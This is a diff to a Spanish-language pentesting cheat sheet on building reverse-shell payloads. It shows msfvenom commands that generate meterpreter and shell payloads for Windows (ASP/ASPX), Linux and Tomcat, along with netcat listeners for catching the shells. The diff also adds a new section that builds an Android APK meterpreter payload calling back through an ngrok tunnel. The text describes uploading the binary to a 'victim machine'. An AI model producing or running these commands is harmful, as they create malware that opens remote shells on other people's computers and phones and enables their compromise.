@@ -26,9 +26,9 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 
 ```bash 
 ❯ rlwrap nc -nlvp 443   # Nos ponemos en escucha por Netcat
-```
-* Ejecutamos el binario que subimos a Windows y ganamos acceso
 
+# Ejecutamos el binario que subimos a Windows y ganamos acceso
+```
 ### Linux Meterpreter
 
 ```bash 
@@ -42,12 +42,11 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 	# LPORT = Local Port Atacante
 ```
 
-* Nos ponemos en escucha por Netcat:dows
 ```bash 
 ❯ nc -nlvp 443
-```
-* Ejecutamos el binario que subimos a Linux y ganamos acceso
 
+# Ejecutamos el binario que subimos a Linux y ganamos acceso
+```
 ## Tomcat 
 
 ```bash 
@@ -64,8 +63,19 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 
 ```bash 
 ❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=1234 -f asp > shell.asp
-	# p = payload 
-	# f = formato
+	# p = PLayload 
+	# f = Formato
 
 ❯ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.68.1 LPORT=1234 -f asp > shell.aspx
+```
+
+## Android APK
+
+```bash 
+❯ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14015 -o msf.apk
+
+	# p = Payload 
+	# LHOST = Dominio de Ngrok
+	# LPORT = Puerto de Ngrok (Se encuentra en el dominio de Ngrok)
+	# o = Exportar como un 'APK'
 ```
